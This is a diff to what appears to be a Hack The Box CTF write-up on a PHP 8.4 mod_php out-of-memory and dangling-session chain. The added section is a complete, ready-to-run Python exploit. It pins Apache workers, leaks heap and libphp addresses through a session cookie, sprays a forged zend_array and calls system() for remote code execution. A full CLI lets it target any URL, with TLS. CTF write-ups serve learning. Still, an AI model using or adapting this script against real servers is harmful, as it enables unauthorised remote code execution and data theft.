@@ -350,6 +350,452 @@ def fire(http, heap, module, cmd, s_offset):
 ```
 When the request finishes, PHP shuts down, walks the dangling `$_SESSION` pointer, calls our fake destructor, and executes `system(cmd)`.
 
+### 3.6 The Full Exploit Script (`exploit_merged.py`)
+
+The snippets above are the individual functions in isolation; below is the complete, ready-to-run script — the GDB-tuned core chain merged with the modular CLI/transport (URL parsing, TLS support, `--connect-ip`, argparse):
+
+```python
+#!/usr/bin/env python3
+"""
+Merged exploit for CVE-2026-109618 / CVE-2026-109619 (Dark Embargo / PHP 8.4 mod_php).
+
+Core chain  : D_oom_mod_php/exploit.py  (GDB-tuned, threaded pinning, wide leak)
+CLI/transport: modular exploit.py         (URL, TLS, --connect-ip, argparse)
+
+Usage:
+  python3 exploit_merged.py --url http://154.57.164.65:39286/index.php \
+      --cmd 'cat /flag.txt >/var/www/html/fx'
+
+  python3 exploit_merged.py --url https://target/app/index.php \
+      --cmd 'cat /flag.txt >/var/www/html/fx'
+
+  python3 exploit_merged.py --host 154.57.164.65 --port 39286 \
+      --cmd 'cat /flag.txt >/var/www/html/fx'
+
+  # If leak succeeds but fire fails, try the alternate landing offset:
+  python3 exploit_merged.py --url http://... --cmd '...' --s-offset 0xF8398
+"""
+import argparse
+import socket
+import ssl
+import struct
+import sys
+import threading
+import time
+import urllib.parse
+from collections import Counter
+
+# ---- offsets derived live with GDB in the challenge container --------------
+ZIF_SYSTEM     = 0x465370      # info address zif_system      (libphp-relative)
+ZVAL_PTR_DTOR  = 0x65EB60      # info address zval_ptr_dtor   (leak landmark)
+DEFAULT_S_OFFSET = 0xF5398     # fake zend_array landing       (chunk-relative)
+PTR_LO, PTR_HI = 0x1000_0000_0000, 0x8000_0000_0000   # wide pointer window
+
+BND_FILL = b"S" * 17
+BND_LEAK = b"B" * 10
+BND_AMP  = b"C" * 10
+SID      = b"attacksessionid0001"
+HUGE_MB  = 129
+DEFAULT_WORKERS = 150
+
+
+# ------------------------------------------------------------------- TLS ----
+def make_tls_ctx(verify: bool = False) -> ssl.SSLContext:
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    if verify:
+        ctx.check_hostname = True
+        ctx.verify_mode = ssl.CERT_REQUIRED
+    else:
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+    try:
+        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+    except Exception:
+        pass
+    return ctx
+
+
+def host_header(host: str, port: int, use_tls: bool) -> str:
+    default = 443 if use_tls else 80
+    return host if port == default else f"{host}:{port}"
+
+
+def open_conn(host: str, port: int, timeout: float, use_tls: bool,
+              tls_ctx, connect_addr=None):
+    s = socket.create_connection((connect_addr or host, port), timeout=timeout)
+    try:
+        s.settimeout(timeout)
+        if use_tls:
+            ctx = tls_ctx or make_tls_ctx(False)
+            s = ctx.wrap_socket(s, server_hostname=host)
+            s.settimeout(timeout)
+        return s
+    except Exception:
+        try: s.close()
+        except Exception: pass
+        raise
+
+
+def parse_url(s: str):
+    if "://" not in s:
+        s = "http://" + s
+    u = urllib.parse.urlparse(s)
+    if not u.hostname:
+        raise SystemExit(f"[!] cannot parse host from: {s!r}")
+    use_tls = (u.scheme == "https")
+    port = u.port or (443 if use_tls else 80)
+    path = u.path or "/index.php"
+    if path == "/":
+        path = "/index.php"
+    return u.hostname, port, path, use_tls
+
+
+# ------------------------------------------------------------- multipart ----
+def part(name, value=b"", filename=None, ctype=None, bnd=BND_AMP):
+    h = b"--" + bnd + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
+    if filename is not None:
+        h += b'; filename="' + filename + b'"'
+    if ctype is not None:
+        h += b"\r\nContent-Type: " + ctype
+    return h + b"\r\n\r\n" + value + b"\r\n"
+
+
+# ---------------------------------------------------------------- Http -------
+class Http:
+    def __init__(self, host, port, path, use_tls, tls_ctx, connect_addr):
+        self.host = host
+        self.port = port
+        self.path = path
+        self.use_tls = use_tls
+        self.tls_ctx = tls_ctx
+        self.connect_addr = connect_addr or host
+        self.host_header = host_header(host, port, use_tls)
+
+    def _sock(self, timeout):
+        return open_conn(self.host, self.port, timeout, self.use_tls,
+                         self.tls_ctx, self.connect_addr)
+
+    def post_chunked(self, blocks, boundary, timeout=120.0):
+        head = (b"POST " + self.path.encode() + b" HTTP/1.1\r\n"
+                b"Host: " + self.host_header.encode() + b"\r\n"
+                b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
+                b"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n")
+        s = self._sock(timeout)
+        out = bytearray()
+        rd = threading.Thread(target=self._drain, args=(s, out, 1 << 20), daemon=True)
+        rd.start()
+        try:
+            s.sendall(head)
+            for b in blocks:
+                s.sendall(b"%X\r\n" % len(b) + b + b"\r\n")
+            s.sendall(b"0\r\n\r\n")
+        except OSError:
+            pass
+        rd.join(timeout + 1)
+        try: s.close()
+        except Exception: pass
+        return bytes(out)
+
+    def post_raw(self, body, boundary, timeout=30.0, read_cap=1 << 20):
+        head = (b"POST " + self.path.encode() + b" HTTP/1.1\r\n"
+                b"Host: " + self.host_header.encode() + b"\r\n"
+                b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
+                b"Content-Length: " + str(len(body)).encode() + b"\r\n"
+                b"Connection: close\r\n\r\n")
+        s = self._sock(timeout)
+        out = bytearray()
+        rd = threading.Thread(target=self._drain, args=(s, out, read_cap), daemon=True)
+        rd.start()
+        try:
+            s.sendall(head + body)
+        except OSError:
+            pass
+        rd.join(timeout + 1)
+        try: s.close()
+        except Exception: pass
+        return bytes(out)
+
+    @staticmethod
+    def _drain(s, out, read_cap):
+        try:
+            while len(out) < read_cap:
+                b = s.recv(min(65536, read_cap - len(out)))
+                if not b:
+                    break
+                out.extend(b)
+        except OSError:
+            pass
+
+
+# 1. hold MaxRequestWorkers-1 children busy, freeing exactly one worker ------
+def saturate(http, n, stop, tls=False):
+    def one():
+        try:
+            s = http._sock(30)
+            s.sendall(b"POST " + http.path.encode() + b" HTTP/1.1\r\n"
+                      b"Host: " + http.host_header.encode() + b"\r\n"
+                      b"Content-Type: multipart/form-data; boundary=ZZZZZZZZZZ\r\n"
+                      b"Transfer-Encoding: chunked\r\n\r\n")
+            first = (b"--ZZZZZZZZZZ\r\n"
+                     b'Content-Disposition: form-data; name="x"\r\n\r\n')
+            s.sendall(b"%X\r\n" % len(first) + first + b"\r\n")
+            while not stop.is_set():
+                s.sendall(b"100\r\n" + b"A" * 0x100 + b"\r\n")
+                time.sleep(0.3)
+        except OSError:
+            pass
+    gap = 0.02 if tls else 0.01
+    for _ in range(n):
+        threading.Thread(target=one, daemon=True).start()
+        time.sleep(gap)
+
+
+# 2. leak the chunk base and libphp base through the session cookie -----------
+def rotate(http):
+    blocks = [part(b"f%04d" % i, b"V" * 3000, bnd=BND_FILL) for i in range(1001)]
+    blocks += [part(b"PHPSESSID", b"\x00", bnd=BND_FILL),
+               part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", bnd=BND_FILL),
+               part(b"f", b"A" * 64, filename=b"a.txt", bnd=BND_FILL)]
+    blocks += [part(b"big", b"B" * (1 << 20), bnd=BND_FILL)] * HUGE_MB
+    http.post_chunked(blocks, BND_FILL, timeout=120.0)
+    time.sleep(0.3)
+    http.post_chunked([part(b"PHPSESSID", SID, bnd=b"BNDRY12345"),
+                       part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", bnd=b"BNDRY12345")],
+                      b"BNDRY12345", timeout=20)
+    time.sleep(0.5)
+
+
+def decode_bases(raw):
+    if len(raw) < 1000:
+        return 0, 0, 0
+    heaps = Counter()
+    for i in range(len(raw) - 7):
+        v = int.from_bytes(raw[i:i + 8], "little")
+        if PTR_LO <= v < PTR_HI:
+            heaps[v & ~0x1FFFFF] += 1
+    if not heaps:
+        return 0, 0, 0
+    heap, hits = heaps.most_common(1)[0]
+    mods = Counter()
+    for i in range(0, len(raw) - 7, 8):
+        v, = struct.unpack_from("<Q", raw, i)
+        if (PTR_LO <= v < PTR_HI and v & 0xFFF == ZVAL_PTR_DTOR & 0xFFF
+                and (v & ~0x1FFFFF) != heap):
+            mods[v - ZVAL_PTR_DTOR] += 1
+    module, mhits = mods.most_common(1)[0] if mods else (0, 0)
+    if hits < 8:
+        return 0, 0, 0
+    return heap, (module if mhits >= 8 else 0), sum(heaps.values())
+
+
+def leak(http, tries=4):
+    for attempt in range(1, tries + 1):
+        rotate(http)
+        prod = [part((b"g%04d" % i + b"x" * 103)[:103], b"v" * 8, bnd=BND_FILL)
+                for i in range(63)]
+        prod.append(part(b"999997", b"W" * 60, bnd=BND_FILL))
+        for i in range(250):
+            extra = 1360 if i == 0 else 0
+            prod.append(part(b"%d" % (1000 + i), b"B" * (258000 + extra), bnd=BND_FILL))
+        prod += [part(b"%d" % (100000 + i), b"X" * 231, bnd=BND_FILL) for i in range(208)]
+        prod += [part(b"%d" % (200000 + i), b"T" * 15000, bnd=BND_FILL) for i in range(100)]
+        prod += [part(b"%d" % (300000 + i), b"U" * 4000, bnd=BND_FILL) for i in range(117)]
+        prod += [part(b"999990", b"z" * 32, bnd=BND_FILL),
+                 part(b"PHPSESSID", b"\x00", bnd=BND_FILL),
+                 part(b"PHP_SESSION_UPLOAD_PROGRESS", b"p" * 200, bnd=BND_FILL),
+                 part(b"F" * 103, b"A" * 64, filename=b"A" * 99 + b".txt", bnd=BND_FILL)]
+        http.post_chunked(prod, BND_FILL)
+        val = bytearray(b"V" * 231)
+        struct.pack_into("<Q", val, 0x78, 0x4000)
+        cons = [part(b"%d" % (1000 + i), bytes(val), bnd=BND_LEAK) for i in range(40)]
+        forged = bytearray(b"W" * 4000)
+        struct.pack_into("<Q", forged, 0x80, 0x4141414141414141)
+        struct.pack_into("<Q", forged, 0x88, 0)
+        struct.pack_into("<Q", forged, 0x90, 600_000)
+        cons.append(part(b"900000", bytes(forged), bnd=BND_LEAK))
+        cons += [part(b"post%d[0]" % i, b"n", bnd=BND_LEAK) for i in range(40)]
+        cons += [part(b"PHPSESSID", SID, bnd=BND_LEAK),
+                 part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", bnd=BND_LEAK)]
+        resp = http.post_raw(b"".join(cons), BND_LEAK, timeout=90.0, read_cap=2 << 20)
+        m = resp.split(b"Set-Cookie: PHPSESSID=", 1)
+        raw = b""
+        if len(m) > 1:
+            raw = urllib.parse.unquote_to_bytes(
+                m[1].split(b"; path=/", 1)[0].decode("latin1"))
+        heap, module, count = decode_bases(raw)
+        print("  leak %d/%d: cookie=%dB ptrs=%d heap=%#x libphp=%#x"
+              % (attempt, tries, len(raw), count, heap, module), flush=True)
+        if heap and module:
+            return heap, module
+    return 0, 0
+
+
+# 3. amplified OOM arm -------------------------------------------------------
+def arm(http):
+    body = bytearray()
+    body += part(b"PHPSESSID", b"a" * 32)
+    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
+    for i in range(115):
+        body += part(b"%03d" % i, b"x")
+    for i in range(880):
+        name = (b"files[R%05d]" % i) + b"[a]" * 62
+        body += part(name, b"", filename=b"", ctype=b"application/octet-stream")
+    body += b"--" + BND_AMP + b"--\r\n"
+    http.post_raw(bytes(body), BND_AMP, timeout=120.0)
+    time.sleep(0.2)
+
+
+# 4. fire --------------------------------------------------------------------
+def fake_array(table_addr, system_addr, cmd):
+    ht = bytearray(384)
+    struct.pack_into("<II", ht, 0x00, 1, 7)
+    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
+    struct.pack_into("<Q", ht, 0x10, table_addr + 0x20)
+    struct.pack_into("<II", ht, 0x18, 1, 1)
+    struct.pack_into("<II", ht, 0x20, 8, 0)
+    struct.pack_into("<Q", ht, 0x30, system_addr)
+    E = 0x20
+    struct.pack_into("<Q", ht, E + 0x10, system_addr)
+    struct.pack_into("<I", ht, E + 0x2C, 1)
+    struct.pack_into("<Q", ht, E + 0x50, table_addr + 0x80)
+    struct.pack_into("<I", ht, E + 0x58, 6)
+    struct.pack_into("<II", ht, 0x80, 1, 0x106)
+    struct.pack_into("<Q", ht, 0x90, len(cmd))
+    ht[0x98:0x98 + len(cmd)] = cmd
+    return bytes(ht)
+
+
+def spray_value(ptr, vl=384):
+    v = bytearray(b"S" * vl)
+    ref = bytearray(32)
+    struct.pack_into("<I", ref, 0, 1); ref[4] = 0x0A
+    struct.pack_into("<Q", ref, 8, ptr)
+    struct.pack_into("<I", ref, 16, 0x0107)
+    for off in range(8, vl - 32 + 1, 32):
+        v[off:off + 32] = ref
+    return bytes(v)
+
+
+def fire(http, heap, module, cmd, s_offset):
+    table_addr, system_addr = heap + s_offset, module + ZIF_SYSTEM
+    print("  fire: table=%#x system=%#x cmd=%r" % (table_addr, system_addr, cmd),
+          flush=True)
+    sv, ht = spray_value(table_addr), fake_array(table_addr, system_addr, cmd)
+    sname = lambda p, i: (p + b"%09d" % i + b"xxxxxxxxxx")[:10]
+    body = bytearray()
+    for i in range(500):
+        body += part(sname(b"s", i), sv)
+    body += part(b"ht", ht)
+    body += part(b"PHPSESSID", b"a" * 32)
+    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
+    for i in range(495):
+        body += part(sname(b"t", i), sv)
+    body += b"--" + BND_AMP + b"--\r\n"
+    http.post_raw(bytes(body), BND_AMP, timeout=30.0)
+    time.sleep(0.4)
+
+
+# ------------------------------------------------------------------- main ---
+def main():
+    ap = argparse.ArgumentParser(
+        description="PHP 8.4 mod_php OOM chain (Dark Embargo) - one-shot RCE")
+    ap.add_argument("--url", default="",
+                    help="target URL e.g. http://host:port/index.php "
+                         "(https:// enables TLS)")
+    ap.add_argument("--host", default=None, help="(alt) target host")
+    ap.add_argument("--port", type=int, default=None, help="(alt) target port")
+    ap.add_argument("--path", default=None, help="(alt) target PHP path")
+    ap.add_argument("--connect-ip", default="",
+                    help="TCP to this IP; Host/SNI still use --host")
+    ap.add_argument("--tls", action="store_true", help="force TLS")
+    ap.add_argument("--no-tls", action="store_true", help="force plaintext")
+    ap.add_argument("--verify-cert", action="store_true",
+                    help="validate server certificate (off by default)")
+    ap.add_argument("--workers", type=int, default=DEFAULT_WORKERS,
+                    help="Apache MaxRequestWorkers (default %d)" % DEFAULT_WORKERS)
+    ap.add_argument("--cmd", default="id", help="command to execute")
+    ap.add_argument("--s-offset", default=None,
+                    help="override landing offset (hex, e.g. 0xF5398)")
+    ap.add_argument("--leak-tries", type=int, default=4,
+                    help="leak attempts (default 4)")
+    ap.add_argument("--fire-tries", type=int, default=8,
+                    help="arm+fire attempts after leak (default 8)")
+    args = ap.parse_args()
+
+    # ---- resolve target ----
+    url_scheme = None
+    if args.url:
+        raw = args.url if "://" in args.url else "http://" + args.url
+        url_scheme = urllib.parse.urlparse(raw).scheme.lower()
+        host, port, path, use_tls = parse_url(raw)
+    else:
+        host = args.host or "127.0.0.1"
+        port = args.port if args.port is not None else 80
+        path = args.path or "/index.php"
+        use_tls = port in (443, 8443)
+    if args.tls:
+        use_tls = True
+    if args.no_tls:
+        use_tls = False
+    if url_scheme == "https" and not args.no_tls:
+        use_tls = True
+    if url_scheme == "http" and not args.tls:
+        use_tls = False
+
+    tls_ctx = make_tls_ctx(args.verify_cert) if use_tls else None
+    connect_addr = args.connect_ip or host
+    cmd = args.cmd.encode()
+    if not cmd or len(cmd) > 200:
+        sys.exit("command must be 1-200 bytes")
+
+    print("[*] target  : %s://%s:%d%s" % (
+        "https" if use_tls else "http", host, port, path))
+    if args.connect_ip:
+        print("[*] connect : %s (Host/SNI: %s)" % (connect_addr, host))
+    print("[*] TLS     : %s" % (
+        "on (cert verify DISABLED)" if use_tls and not args.verify_cert
+        else "on (cert verify ENABLED)" if use_tls else "off"))
+    print("[*] workers : %d (pinning %d holders)"
+          % (args.workers, args.workers - 1))
+
+    try:
+        socket.getaddrinfo(connect_addr, port, type=socket.SOCK_STREAM)
+    except socket.gaierror as exc:
+        sys.exit("[!] cannot resolve %r: %s" % (connect_addr, exc))
+
+    http = Http(host, port, path, use_tls, tls_ctx, connect_addr)
+    stop = threading.Event()
+
+    print("[*] saturating the worker pool (%d blockers)" % (args.workers - 1),
+          flush=True)
+    saturate(http, args.workers - 1, stop, tls=use_tls)
+    time.sleep(2.5 if use_tls else 2.0)
+
+    try:
+        print("[*] leaking bases", flush=True)
+        heap, module = leak(http, tries=args.leak_tries)
+        if not heap or not module:
+            sys.exit("[-] leak failed")
+
+        s_offset = int(args.s_offset, 16) if args.s_offset else DEFAULT_S_OFFSET
+        print("[+] chunk=%#x libphp=%#x (S_OFFSET=%#x)"
+              % (heap, module, s_offset), flush=True)
+
+        for attempt in range(1, args.fire_tries + 1):
+            print("[*] arm + fire %d/%d (S=chunk+%#x)"
+                  % (attempt, args.fire_tries, s_offset), flush=True)
+            arm(http)
+            fire(http, heap, module, cmd, s_offset)
+    finally:
+        stop.set()
+
+    print("[+] done - verify the command result", flush=True)
+
+
+if __name__ == "__main__":
+    main()
+```
+
 ---
 
 ## Phase 4: Remote Exploitation
@@ -384,12 +830,4 @@ curl http://154.57.164.65:39286/fx
 ```text
 HTB{6391a68f9c527618638a2f638acdf22e}
 ```
-
-## Flag
-
-```text
-HTB{6391a68f9c527618638a2f638acdf22e}
-```
-
-RCE achieved on the PHP engine itself — the flag is read by the engine's own `system()`, invoked through its own shutdown cleanup.
 
